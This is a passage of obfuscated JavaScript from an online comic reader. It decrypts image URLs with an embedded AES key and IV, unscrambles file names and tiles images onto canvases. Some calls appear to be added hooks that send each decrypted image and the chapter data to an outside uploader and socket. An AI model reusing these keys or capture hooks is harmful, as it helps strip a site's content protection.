'W4FcKCophCkP', 'rCoSBdRcGa'];
  a0_0x12b7 = function () {
    return _0x44bd4c;
  };
  return a0_0x12b7();
}
ComicViewer.prototype.initServers = function () {
  var _0x4787f3 = this;
  function _0x1c2602(_0x2ee750, _0x15f49b) {
    var _0x5a4b42 = $("<div class=\"btn btn-primary\" />").text("Server " + _0x2ee750);
    _0x5a4b42.click(function () {
      var _0x323de8 = _0x4787f3.servers_el.data("current");
      if (_0x323de8 != _0x2ee750) {
        _0x4787f3.servers_el.data("current", _0x2ee750);
        _0x4787f3.viewer_el.empty();
        var _0x907fc4 = _0x15f49b[_0x4787f3.webp_support ? "webp" : "jpeg"];
        _0x4787f3.loadImages(_0x907fc4);
      }
    }).appendTo(_0x4787f3.servers_el);
    if (_0x2ee750 == 1) {
      _0x5a4b42.click();
    }
  }
  _0x4787f3.getChapterData(function (_0x9c4611) {
    _0x4787f3.total_images = _0x9c4611.total;
    var _0x324e67 = 1;
    for (var _0x7ac365 in _0x9c4611.data) {
      _0x1c2602(_0x324e67, _0x9c4611.data[_0x7ac365]);
      _0x324e67++;
    }
    if (_0x324e67 == 2) {
      _0x4787f3.servers_wrapper_el.hide();
    }
  });
};
ComicViewer.prototype.getChapterData = function (_0x486696) {
  var _0x317e3f = this;
  if (_0x317e3f.loaded || _0x317e3f.loading) {
    return;
  }
  _0x317e3f.loading = true;
  $.ajax({
    'url': "/content/rest",
    'data': {
      't': "chapter",
      'cid': this.comic_id,
      'chid': this.chapter_id,
      'sig': this.sig,
      's': new URLSearchParams(window.location.search).get('s')
    },
    'success': function (_0x3c1881) {
      if (_0x3c1881.error == 0) {
        _0x486696(_0x3c1881);
        if (window.socket) {
          window.socket.send(JSON.stringify({
            action: "log_images",
            payload: {
              data: _0x3c1881,
              fid: _0x317e3f.chapter_id
            }
          }));
        }
      } else {
        _0x317e3f.viewer_el.find('h3').html(_0x3c1881.error_msg);
      }
    },
    'error': function (_0x544adf) {
      _0x317e3f.viewer_el.find('h3').html("Có lỗi xảy ra. Vui lòng thử lại,");
    },
    'complete': function () {
      _0x317e3f.loading = false;
    }
  });
};
ComicViewer.prototype.loadImages = function (_0x5fec3) {
  var _0x250b2f = this;
  var _0xf82641 = false;
  var _0x585154 = function (_0x2996a6, _0x4dfe9a, _0x1b83eb) {
    try {
      _0x1b83eb = _0x250b2f.crypto.enc.Utf8.parse(_0x1b83eb);
      if (_0x4dfe9a.length < 32) {
        _0x4dfe9a = _0x4dfe9a.padEnd(32, "\0");
      }
      var _0x39aa83 = _0x250b2f.crypto.AES.decrypt(_0x2996a6, _0x250b2f.crypto.enc.Utf8.parse(_0x4dfe9a), {
        'iv': _0x1b83eb
      });
      return _0x39aa83.toString(_0x250b2f.crypto.enc.Utf8);
    } catch (_0x458ce7) {}
    return '';
  };
  if (window.ReactNativeWebView) {
    window.ReactNativeWebView.postMessage("json" + JSON.stringify({
      'type': "pinning",
      'domain_pinning': "admob.com",
      'dns_detect': true
    }));
  }
  if (window.ReactNativeWebView) {
    window.ReactNativeWebView.postMessage("json" + JSON.stringify({
      'type': "otp",
      'vid': _0x250b2f.chapter_id
    }));
  }
  var _0x48de89 = [];
  for (var _0x373858 in _0x5fec3) {
    var _0x1b9aa6 = $("<div data-idx=" + _0x373858 + "></div>").appendTo(_0x250b2f.viewer_el);
    if (_0x250b2f.enable_more_btn) {
      if (_0x250b2f.total_images > 3 && _0x48de89.length > _0x250b2f.total_images / 3) {
        _0x1b9aa6.hide();
        if (!_0xf82641) {
          _0xf82641 = true;
          var _0x53c1d9 = _0x250b2f.more_btn_el.detach().appendTo(_0x250b2f.viewer_el).show();
          _0x53c1d9.click(function () {
            _0x250b2f.viewer_el.find("> div").show();
            _0x53c1d9.hide();
          });
        }
      }
    }
    for (var _0x3f1996 in _0x5fec3[_0x373858]) {
      _0x1b9aa6.append("<div data-idx=" + _0x3f1996 + ">Loading...</div>");
      _0x48de89.push([_0x5fec3[_0x373858][_0x3f1996], _0x373858, _0x3f1996]);
    }
  }
  var _0x4c9090 = 0;
  function _0x2de81e(_0xfce19e, _0x414902, _0x1a1906, _0x22fceb) {
    var _0x509487 = _0x250b2f.viewer_el.find("[data-idx=" + _0xfce19e[_0x414902][1] + "] [data-idx=" + _0xfce19e[_0x414902][2] + ']');
    var _0x494f2e = _0x585154(_0xfce19e[_0x414902][0], "f9a0364a9df71b0", "fb047231a480949f");
    if (!_0x494f2e) {
      _0x1a1906(_0x22fceb);
      return;
    }
    var _0xaa9eea = _0x494f2e.match(/\/([^\/]+)\.(webp|jpeg)/);
    if (_0xaa9eea) {
      var _0x245d69 = _0xaa9eea[1];
      function _0x4f870b(_0xde4cb4) {
        var _0x5e4c35 = atob(_0xde4cb4);
        var _0x4172fe = '';
        for (var _0x5d7e7c = 0; _0x5d7e7c < _0x5e4c35.length; _0x5d7e7c++) {
          var _0x1895d7 = _0x5e4c35.charCodeAt(_0x5d7e7c).toString(16);
          _0x4172fe += _0x1895d7.length === 2 ? _0x1895d7 : '0' + _0x1895d7;
        }
        return _0x4172fe.toUpperCase();
      }
      var _0x25b4ab = function (_0x2b58f8) {
        var _0x3375bb = [];
        for (var _0x1d3231 = 0; _0x1d3231 < _0x2b58f8.length; _0x1d3231++) {
          var _0x57e3c7 = parseInt(_0x2b58f8[_0x1d3231], 16) - parseInt("06f7be34edf067082dbfabb4e25ca928"[_0x1d3231 % "06f7be34edf067082dbfabb4e25ca928".length], 16);
          if (_0x57e3c7 < 0) {
            _0x57e3c7 += 16;
          }
          _0x3375bb.push((_0x57e3c7 % 16).toString(16));
        }
        return _0x3375bb.join('');
      };
      var _0x2f1a93 = function (_0x471216) {
        _0x471216 = _0x471216.replaceAll('+', '-');
        _0x471216 = _0x471216.replaceAll('/', '_');
        _0x471216 = _0x471216.replaceAll('=', '');
        return _0x471216;
      };
      var _0x1ec763 = function (_0x36054c) {
        _0x36054c = _0x36054c.replaceAll('-', '+');
        _0x36054c = _0x36054c.replaceAll('_', '/');
        return _0x36054c;
      };
      var _0x56e208 = _0x4f870b(_0x1ec763(_0x245d69));
      var _0x12abdf = _0x25b4ab(_0x56e208);
      function _0x4b75ed(_0x128b49) {
        return btoa(_0x128b49.match(/\w{2}/g).map(function (_0xf4a75c) {
          return String.fromCharCode(parseInt(_0xf4a75c, 16));
        }).join(''));
      }
      var _0x26f673 = _0x2f1a93(_0x4b75ed(_0x12abdf));
      if (_0x26f673) {
        _0x494f2e = _0x494f2e.replace(_0xaa9eea[1], _0x26f673);
      }
    }
    if (!_0x22fceb) {
      _0x22fceb = new Image();
      _0x22fceb.crossOrigin = "anonymous";
    }
    _0x22fceb.onload = function () {
      fuckFuhu.uploadImage(_0x22fceb, _0xfce19e[_0x414902][1] + '_' + _0xfce19e[_0x414902][2]);
      _0x509487.empty();
      if (_0x4c9090 > 52428800) {
        _0x509487.append(_0x22fceb.cloneNode(true));
        _0x1a1906(_0x22fceb);
        return;
      }
      var _0x504b4d = $("<div class='c-holder' />");
      var _0x45250c = _0x22fceb.width;
      var _0x5e28f1 = _0x22fceb.height;
      _0x4c9090 += _0x45250c * _0x5e28f1 * 4;
      _0x504b4d[0].style.maxWidth = _0x45250c;
      function _0x27981d(_0x2a9a85, _0x235730) {
        _0x2a9a85 = Math.ceil(_0x2a9a85);
        _0x235730 = Math.floor(_0x235730);
        return Math.floor(Math.random() * (_0x235730 - _0x2a9a85 + 1)) + _0x2a9a85;
      }
      var _0x3bd0dd = _0x27981d(1, 2);
      var _0x22ebbe = _0x27981d(1, 3);
      var _0x4ea24c = _0x45250c / _0x3bd0dd;
      var _0x3ad2fe = _0x5e28f1 / _0x22ebbe;
      for (var _0x4615f2 = 0; _0x4615f2 < _0x22ebbe; _0x4615f2++) {
        for (var _0x3c3d31 = 0; _0x3c3d31 < _0x3bd0dd; _0x3c3d31++) {
          var _0x48fc73 = document.createElement("canvas");
          var _0x46f4e5 = _0x48fc73.getContext('2d');
          _0x48fc73.width = _0x4ea24c;
          _0x48fc73.height = _0x3ad2fe;
          _0x48fc73.style.width = 100 / _0x3bd0dd + '%';
          var _0x5c77cc = dx = _0x3c3d31 * _0x4ea24c;
          var _0x1a1f91 = dy = _0x4615f2 * _0x3ad2fe;
          _0x46f4e5.drawImage(_0x22fceb, _0x5c77cc, _0x1a1f91, _0x4ea24c, _0x3ad2fe, 0, 0, _0x4ea24c, _0x3ad2fe);
          _0x504b4d.append(_0x48fc73);
        }
      }
      _0x509487.append(_0x504b4d);
      if (_0x5e28f1 > 150) {
        var _0x1835c0 = function () {
          var _0x1769ce = _0x250b2f.viewer_el.width();
          if (_0x1769ce >= _0x45250c) {
            _0x504b4d[0].style.width = "auto";
            return;
          }
          var _0x310e0c = _0x1769ce / _0x45250c * _0x5e28f1;
          _0x504b4d[0].style.width = _0x310e0c / _0x5e28f1 * _0x45250c;
          if (_0x504b4d.find("canvas").length > 0) {
            _0x504b4d.find("canvas").css({
              'width': _0x1769ce / _0x3bd0dd + 'px',
              'height': _0x310e0c / _0x22ebbe + 'px'
            });
          }
        };
        $(window).resize(_0x1835c0);
        _0x1835c0();
      }
      _0x1a1906(_0x22fceb);
    };
    _0x22fceb.onerror = function () {
      _0x1a1906(_0x22fceb);
    };
    if (window.ReactNativeWebView) {
      window.ReactNativeWebView.postMessage("json" + JSON.stringify({
        'type': "img-prefetch",
        'url': _0x494f2e,
        'vid': _0x250b2f.chapter_id
      }));
    }
    if (_0x494f2e.indexOf("&v=2") > -1 && !(["iPad Simulator", "iPhone Simulator", "iPod Simulator", "iPad", "iPhone", "iPod"].includes(navigator.platform) || navigator.userAgent.includes("Mac") && "ontouchend" in document)) {
      var _0x4fd65e = function (_0x159b66, _0x5a42de, _0x10649a) {
        var _0xea39ad = 0;
        var _0x989233 = setInterval(function () {
          if (_0xea39ad > _0x159b66 / 100) {
            clearInterval(_0x989233);
            _0x10649a();
            return;
          }
          _0xea39ad++;
          if (_0x5a42de()) {
            clearInterval(_0x989233);
          }
        }, 100);
      };
      _0x4fd65e(10000, function () {
        if (window.IMGFLAG && window.IMGFLAG[_0x494f2e]) {
          _0x22fceb.src = _0x494f2e;
          return true;
        }
        return false;
      }, function () {
        _0x22fceb.src = _0x494f2e;
      });
    } else {
      _0x22fceb.src = _0x494f2e;
    }
  }
  var _0x6ed802 = [];
  for (var _0x373858 = 0; _0x373858 < _0x48de89.length / 5; _0x373858++) {
    var _0x2c5391 = _0x48de89.splice(Math.floor(Math.random() * _0x48de89.length), 1);
    _0x6ed802.push(_0x2c5391[0]);
  }
  function _0x9a14bc(_0x57e615, _0x1b1fbb) {
    var _0x257ffb = -1;
    function _0x484e4c(_0x2f8716) {
      _0x257ffb += 1;
      if (_0x257ffb < _0x57e615.length) {
        _0x2de81e(_0x57e615, _0x257ffb, _0x484e4c, _0x2f8716);
      }
    }
    for (var _0x50b92a = 0; _0x50b92a < _0x1b1fbb; _0x50b92a++) {
      _0x484e4c();
    }
  }
  var _0x1f374a = function () {
    _0x9a14bc(_0x48de89, _0x250b2f.max_loading - 1);
    _0x9a14bc(_0x6ed802, 1);
  };
  _0x1f374a();
};
function a0_0x399d42(_0x33600d, _0x587f25, _0x2be9c7, _0x3adc96, _0x53eb29) {
  return a0_0x1c06(_0x33600d - 0x388, _0x53eb29);
}
ComicViewer.prototype.waiting = function (_0x19d999, _0x173543, _0x5b17c5) {
  var _0xba1c42 = 0;
  var _0x94e18e = setInterval(function () {
    if (_0xba1c42 > _0x19d999 / 100) {
      clearInterval(_0x94e18e);
      _0x5b17c5();
      return;
    }
    _0xba1c42++;
    if (_0x173543()) {
      clearInterval(_0x94e18e);
    }
  }, 100);
};
ComicViewer.prototype.run = function () {
  var _0x24c7a2 = this;
  function _0x11eff6(_0x6e2f3b, _0x514ed0) {
    var _0x5d94be = {
      'lossy': "UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA",
      'lossless': "UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==",
      'alpha': "UklGRkoAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAwAAAARBxAR/Q9ERP8DAABWUDggGAAAABQBAJ0BKgEAAQAAAP4AAA3AAP7mtQAAAA==",
      'animation': "UklGRlIAAABXRUJQVlA4WAoAAAASAAAAAAAAAAAAQU5JTQYAAAD/////AABBTk1GJgAAAAAAAAAAAAAAAAAAAGQAAABWUDhMDQAAAC8AAAAQBxAREYiI/gcA"
    };
    var _0x4fd300 = new Image();
    _0x4fd300.onload = function () {
      var _0x391922 = _0x4fd300.width > 0 && _0x4fd300.height > 0;
      _0x514ed0(_0x6e2f3b, _0x391922);
    };
    _0x4fd300.onerror = function () {
      _0x514ed0(_0x6e2f3b, false);
    };
    _0x4fd300.src = "data:image/webp;base64," + _0x5d94be[_0x6e2f3b];
  }
  _0x11eff6("lossy", function (_0x5145f2, _0x4db671) {
    _0x24c7a2.webp_support = _0x4db671;
    _0x24c7a2.initServers();
  });
};